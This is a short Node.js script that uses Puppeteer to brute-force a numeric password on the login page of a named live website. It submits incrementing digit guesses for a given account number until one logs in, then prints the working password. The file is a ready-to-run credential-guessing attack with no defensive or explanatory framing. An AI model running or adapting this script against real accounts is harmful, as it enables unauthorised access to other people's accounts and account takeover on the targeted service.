const puppeteer = require("puppeteer");
(async () => {
  let pass = process.argv[2];
  let number = process.argv[3];
  let BASE_URL = "https://www.animax.app/login#/login";
  const browser = await puppeteer.launch();
  while (true) {
    let letters = pass.split("");
    let last = letters.length - 1;
    while (Number(letters[last]) + 1 > 9) {
      letters[last] = "0";
      last--;
    }
    letters[last] = (Number(letters[last]) + 1).toString();
    let a = letters.join("");
    const page = await browser.newPage();
    await page.setViewport({ width: 640, height: 400 });
    await page.goto(BASE_URL);
    await page.type(".input.email-input", number);
    await page.type(".input.password-input", a, { delay: 10 });
    await page.click('button[type="button"]');
    await page.waitForTimeout(1000);
    const url = await page.url();
    if (url == "https://www.animax.app/") {
      console.log("pass", Number(pass) + 1);
      await browser.close();
      break;
    }
    await page.close();
    console.log("failed", a);
    pass = letters.join("");
  }
})();
